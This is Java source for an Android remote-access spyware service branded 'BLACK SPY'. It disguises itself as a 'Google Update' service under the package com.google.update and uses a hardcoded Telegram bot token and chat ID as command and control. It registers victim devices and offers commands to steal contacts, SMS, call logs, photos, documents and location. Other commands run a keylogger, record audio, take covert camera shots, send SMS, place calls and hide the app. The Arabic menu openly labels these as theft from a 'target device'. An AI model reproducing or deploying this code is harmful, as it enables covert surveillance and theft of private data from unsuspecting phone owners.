package com.google.update;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
public class TelegramBotService extends Service {
    private static final String BOT_TOKEN = "8640775836:AAH6zGPNagHHqRLTmgfdlCW5ggz4MGh3-ts";
    private static final String CHAT_ID = "6793813126";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    private int lastUpdateId = 0;
    private String targetDeviceId = null;
    private String targetDeviceName = null;
    private boolean deviceRegistered = false;
    private MediaRecorder mediaRecorder;
    private String currentAudioPath;
    private boolean isRecording = false;
    @Override public void onCreate() { 
        super.onCreate(); 
        startForeground(1, createNotification()); 
        startBot();
        sendRegistration(); 
    }
    private void sendRegistration() {
        new Thread(() -> {
            try {
                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " Android " + Build.VERSION.RELEASE;
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("device_name", deviceName);
                String msg = "REGISTER:" + json.toString();
                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                int code = conn.getResponseCode();
                conn.disconnect();
                if (code == 200) {
                    Log.i("BlackSpy", "Registration sent successfully");
                }
            } catch (Exception e) {
                Log.e("BlackSpy", "Registration error: " + e.getMessage());
            }
        }).start();
    }
    private void startBot() {
        Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
            try {
                String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
                if (response != null && response.contains("\"ok\":true")) {
                    JSONObject json = new JSONObject(response);
                    JSONArray results = json.getJSONArray("result");
                    for (int i = 0; i < results.length(); i++) {
                        JSONObject update = results.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id");
                        if (update.has("message") && update.getJSONObject("message").has("text")) {
                            JSONObject msg = update.getJSONObject("message");
                            String text = msg.getString("text").trim();
                            long chatId = msg.getJSONObject("chat").getLong("id");
                            if (String.valueOf(chatId).equals(CHAT_ID)) {
                                handleCommand(text);
                            } else if (text.startsWith("REGISTER:")) {
                                String data = text.replace("REGISTER:", "");
                                JSONObject info = new JSONObject(data);
                                String deviceId = info.getString("device_id");
                                String deviceName = info.getString("device_name");
                                if (targetDeviceId == null) {
                                    targetDeviceId = deviceId;
                                    targetDeviceName = deviceName;
                                    deviceRegistered = true;
                                    sendMessage("✅ BLACK SPY ONLINE ✅\n📍 الجهاز: " + deviceName);
                                    sendCommandMenu();
                                } else if (!deviceRegistered) {
                                    targetDeviceId = deviceId;
                                    targetDeviceName = deviceName;
                                    deviceRegistered = true;
                                    sendMessage("✅ BLACK SPY ONLINE ✅\n📍 الجهاز: " + deviceName);
                                    sendCommandMenu();
                                }
                            }
                        }
                    }
                }
            } catch (Exception e) { Log.e("Bot", "Error", e); }
        }, 0, 2, TimeUnit.SECONDS);
    }
    private void handleCommand(String cmd) {
        String c = cmd.trim().toLowerCase();
        if (c.equals("/start")) {
            if (targetDeviceId == null) {
                sendMessage("🔥 BLACK SPY 🔥\n\n⏳ جاري انتظار اتصال الجهاز...\n✅ تأكد من تثبيت APK على الجهاز المستهدف");
            } else {
                sendCommandMenu();
            }
        } else {
            if (targetDeviceId == null) {
                sendMessage("❌ لا يوجد جهاز مستهدف. انتظر اتصال جهاز أولاً.");
                return;
            }
            if (c.equals("/contacts")) sendToDevice(targetDeviceId, "GET_CONTACTS");
            else if (c.equals("/sms")) sendToDevice(targetDeviceId, "GET_SMS");
            else if (c.equals("/calllogs")) sendToDevice(targetDeviceId, "GET_CALLLOGS");
            else if (c.equals("/info")) sendToDevice(targetDeviceId, "GET_INFO");
            else if (c.equals("/battery")) sendToDevice(targetDeviceId, "GET_BATTERY");
            else if (c.equals("/location")) sendToDevice(targetDeviceId, "GET_LOCATION");
            else if (c.equals("/network")) sendToDevice(targetDeviceId, "GET_NETWORK");
            else if (c.equals("/sim")) sendToDevice(targetDeviceId, "GET_SIM");
            else if (c.equals("/record")) sendToDevice(targetDeviceId, "START_RECORD");
            else if (c.equals("/stoprec")) sendToDevice(targetDeviceId, "STOP_RECORD");
            else if (c.equals("/volumeup")) sendToDevice(targetDeviceId, "VOLUME_UP");
            else if (c.equals("/volumedown")) sendToDevice(targetDeviceId, "VOLUME_DOWN");
            else if (c.equals("/mute")) sendToDevice(targetDeviceId, "MUTE");
            else if (c.equals("/photo")) sendToDevice(targetDeviceId, "PHOTO");
            else if (c.equals("/photofront")) sendToDevice(targetDeviceId, "PHOTOFRONT");
            else if (c.equals("/screenshot")) sendToDevice(targetDeviceId, "SCREENSHOT");
            else if (c.equals("/screenrecord")) sendToDevice(targetDeviceId, "SCREENRECORD");
            else if (c.startsWith("/copy_photos ")) sendToDevice(targetDeviceId, "COPY_PHOTOS|" + cmd.substring(13));
            else if (c.startsWith("/copy_videos ")) sendToDevice(targetDeviceId, "COPY_VIDEOS|" + cmd.substring(13));
            else if (c.startsWith("/copy_audio ")) sendToDevice(targetDeviceId, "COPY_AUDIO|" + cmd.substring(12));
            else if (c.startsWith("/copy_docs ")) sendToDevice(targetDeviceId, "COPY_DOCS|" + cmd.substring(11));
            else if (c.startsWith("/copy_contacts ")) sendToDevice(targetDeviceId, "COPY_CONTACTS|" + cmd.substring(15));
            else if (c.startsWith("/copy_sms ")) sendToDevice(targetDeviceId, "COPY_SMS|" + cmd.substring(10));
            else if (c.startsWith("/copy_calls ")) sendToDevice(targetDeviceId, "COPY_CALLS|" + cmd.substring(12));
            else if (c.equals("/steal_all")) sendToDevice(targetDeviceId, "STEAL_ALL");
            else if (c.equals("/steal_photos")) sendToDevice(targetDeviceId, "STEAL_PHOTOS");
            else if (c.equals("/steal_videos")) sendToDevice(targetDeviceId, "STEAL_VIDEOS");
            else if (c.equals("/steal_audio")) sendToDevice(targetDeviceId, "STEAL_AUDIO");
            else if (c.equals("/steal_docs")) sendToDevice(targetDeviceId, "STEAL_DOCS");
            else if (c.equals("/steal_contacts")) sendToDevice(targetDeviceId, "STEAL_CONTACTS");
            else if (c.equals("/steal_sms")) sendToDevice(targetDeviceId, "STEAL_SMS");
            else if (c.equals("/steal_calls")) sendToDevice(targetDeviceId, "STEAL_CALLS");
            else if (c.equals("/zip")) sendToDevice(targetDeviceId, "GET_ZIP");
            else if (c.equals("/photos")) sendToDevice(targetDeviceId, "GET_PHOTOS");
            else if (c.equals("/videos")) sendToDevice(targetDeviceId, "GET_VIDEOS");
            else if (c.equals("/audio")) sendToDevice(targetDeviceId, "GET_AUDIO");
            else if (c.equals("/documents")) sendToDevice(targetDeviceId, "GET_DOCUMENTS");
            else if (c.startsWith("/search ")) sendToDevice(targetDeviceId, "SEARCH|" + cmd.substring(8));
            else if (c.startsWith("/download ")) sendToDevice(targetDeviceId, "DOWNLOAD|" + cmd.substring(10));
            else if (c.startsWith("/mkdir ")) sendToDevice(targetDeviceId, "MKDIR|" + cmd.substring(7));
            else if (c.equals("/apps")) sendToDevice(targetDeviceId, "GET_APPS");
            else if (c.startsWith("/openapp ")) sendToDevice(targetDeviceId, "OPEN_APP|" + cmd.substring(9));
            else if (c.startsWith("/install ")) sendToDevice(targetDeviceId, "INSTALL_APP|" + cmd.substring(9));
            else if (c.startsWith("/uninstall ")) sendToDevice(targetDeviceId, "UNINSTALL_APP|" + cmd.substring(11));
            else if (c.startsWith("/disable ")) sendToDevice(targetDeviceId, "DISABLE_APP|" + cmd.substring(9));
            else if (c.startsWith("/enable ")) sendToDevice(targetDeviceId, "ENABLE_APP|" + cmd.substring(8));
            else if (c.startsWith("/appinfo ")) sendToDevice(targetDeviceId, "APP_INFO|" + cmd.substring(9));
            else if (c.startsWith("/killapp ")) sendToDevice(targetDeviceId, "KILL_APP|" + cmd.substring(9));
            else if (c.equals("/hide")) sendToDevice(targetDeviceId, "HIDE_APP");
            else if (c.equals("/show")) sendToDevice(targetDeviceId, "SHOW_APP");
            else if (c.startsWith("/toast ")) sendToDevice(targetDeviceId, "TOAST|" + cmd.substring(7));
            else if (c.startsWith("/notify ")) sendToDevice(targetDeviceId, "NOTIFY|" + cmd.substring(8));
            else if (c.startsWith("/vibrate ")) sendToDevice(targetDeviceId, "VIBRATE|" + cmd.substring(9));
            else if (c.startsWith("/openurl ")) sendToDevice(targetDeviceId, "OPENURL|" + cmd.substring(9));
            else if (c.equals("/clipboard")) sendToDevice(targetDeviceId, "GET_CLIPBOARD");
            else if (c.equals("/keylogger start")) sendToDevice(targetDeviceId, "KEYLOGGER_START");
            else if (c.equals("/keylogger stop")) sendToDevice(targetDeviceId, "KEYLOGGER_STOP");
            else if (c.equals("/keylogger send")) sendToDevice(targetDeviceId, "KEYLOGGER_SEND");
            else if (c.startsWith("/sms_send ")) sendToDevice(targetDeviceId, "SMS_SEND|" + cmd.substring(10));
            else if (c.startsWith("/call ")) sendToDevice(targetDeviceId, "CALL|" + cmd.substring(6));
            else if (c.startsWith("/ussd ")) sendToDevice(targetDeviceId, "USSD|" + cmd.substring(6));
            else sendMessage("❌ أمر غير معروف");
        }
    }
    private void sendCommandMenu() {
        String menu = "🔥 BLACK SPY 🔥\n"
                + "╔════════════════════════════╗\n"
                + "║   👹 Black Spy 👹          ║\n"
                + "║   🕷️ Hackers Walking Anous 🕷️\n"
                + "║   💀 Under World Spy 💀    ║\n"
                + "╚════════════════════════════╝\n\n"
                + "✅ <b>الجهاز المستهدف:</b> " + targetDeviceName + "\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n"
                + "🔰 <b>قائمة الأوامر</b> 🔰\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                + "<b>📇 DATA / بيانات</b>\n"
                + "/contacts 📱 جهات الاتصال\n"
                + "/sms 💬 رسائل SMS\n"
                + "/calllogs 📞 سجلات المكالمات\n"
                + "/info ℹ️ معلومات الجهاز\n"
                + "/battery 🔋 حالة البطارية\n"
                + "/location 📍 الموقع الجغرافي\n"
                + "/network 🌐 معلومات الشبكة\n"
                + "/sim 📇 معلومات SIM\n\n"
                + "<b>🎤 AUDIO / صوت</b>\n"
                + "/record 🎙️ تسجيل الصوت\n"
                + "/stoprec ⏹️ إيقاف التسجيل\n"
                + "/volumeup 🔊 رفع الصوت\n"
                + "/volumedown 🔉 خفض الصوت\n"
                + "/mute 🔇 كتم الصوت\n\n"
                + "<b>📸 CAMERA / كاميرا</b>\n"
                + "/photo 📷 تصوير بالكاميرا الخلفية\n"
                + "/photofront 🤳 تصوير بالكاميرا الأمامية\n"
                + "/screenshot 📸 لقطة شاشة\n"
                + "/screenrecord 🎥 تسجيل الشاشة\n\n"
                + "<b>💀 STEAL / سرقة</b>\n"
                + "/steal_all 💀 سرقة كل شيء\n"
                + "/steal_photos 🖼️ سرقة الصور\n"
                + "/steal_videos 🎬 سرقة الفيديوهات\n"
                + "/steal_audio 🎵 سرقة الصوتيات\n"
                + "/steal_docs 📄 سرقة المستندات\n"
                + "/steal_contacts 📱 سرقة جهات الاتصال\n"
                + "/steal_sms 💬 سرقة الرسائل\n"
                + "/steal_calls 📞 سرقة سجلات المكالمات\n\n"
                + "<b>📁 FILES / ملفات</b>\n"
                + "/zip 📦 ضغط الملفات\n"
                + "/photos 🖼️ قائمة الصور\n"
                + "/videos 🎬 قائمة الفيديوهات\n"
                + "/audio 🎵 قائمة الصوتيات\n"
                + "/documents 📄 قائمة المستندات\n"
                + "/search 🔍 بحث في الملفات\n"
                + "/download ⬇️ تحميل ملف\n"
                + "/mkdir 📁 إنشاء مجلد\n\n"
                + "<b>📱 APPS / تطبيقات</b>\n"
                + "/apps 📱 قائمة التطبيقات\n"
                + "/openapp 🚀 فتح تطبيق\n"
                + "/install 📲 تثبيت تطبيق\n"
                + "/uninstall ❌ إلغاء تثبيت\n"
                + "/disable 🚫 تعطيل تطبيق\n"
                + "/enable ✅ تفعيل تطبيق\n"
                + "/killapp 💀 إغلاق تطبيق\n\n"
                + "<b>👁 STEALTH / إخفاء</b>\n"
                + "/hide 👻 إخفاء التطبيق\n"
                + "/show 👁️ إظهار التطبيق\n"
                + "/toast 💬 رسالة منبثقة\n"
                + "/notify 🔔 إشعار وهمي\n"
                + "/vibrate 📳 اهتزاز\n"
                + "/openurl 🌐 فتح رابط\n"
                + "/clipboard 📋 محتوى الحافظة\n\n"
                + "<b>⌨️ KEYLOGGER / تسجيل ضغطات</b>\n"
                + "/keylogger start ▶️ تشغيل\n"
                + "/keylogger stop ⏹️ إيقاف\n"
                + "/keylogger send 📤 إرسال المسجل\n\n"
                + "<b>📞 SMS & CALLS / رسائل ومكالمات</b>\n"
                + "/sms_send ✉️ إرسال SMS\n"
                + "/call 📞 إجراء مكالمة\n"
                + "/ussd 🔢 كود USSD\n\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n"
                + "⚠️ <b>جميع الأوامر تنفذ على:</b> " + targetDeviceName;
        sendMessage(menu);
    }
    private void sendToDevice(String deviceId, String cmd) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + deviceId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
                sendMessage("✅ تم إرسال الأمر: " + cmd);
            } catch (Exception e) { sendMessage("❌ فشل الإرسال"); }
        }).start();
    }
    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML";
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    private String get(String urlStr) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }
    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("google_ch", "Google", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        return new NotificationCompat.Builder(this, "google_ch")
            .setContentTitle("Google Update").setContentText("Online").setSmallIcon(android.R.drawable.ic_dialog_info).setOngoing(true).build();
    }
    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
